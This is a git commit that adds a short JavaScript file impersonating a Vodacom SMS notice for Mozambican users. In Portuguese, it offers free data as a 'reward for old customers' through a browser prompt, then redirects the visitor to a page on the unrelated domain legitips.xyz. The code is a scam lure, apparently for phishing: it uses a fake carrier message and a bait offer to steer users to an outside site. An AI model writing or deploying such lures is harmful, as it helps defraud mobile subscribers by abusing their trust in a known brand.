9f5649f817f0d85cfecd8efe188d4f8ec7fc3b7d
legitips <83867893+legitips@users.noreply.github.com>
2024-07-02 12:30:05 -0700

    Create activation-vodacom-mz.js

---
+++ activation-vodacom-mz.js
@@ -0,0 +1,5 @@
+var password = '1'
+password=prompt('VODACOM SMS: Prezado cliente, por favor verifique se o seu cartão SIM VODACOM está qualificado para receber dados gratuitos, Recompensa de clientes antigos, pressione 1 para verificar agora ','1');
+if (password != '1') {
+location.href='https://legitips.xyz/vodacom-mz.html';
+}
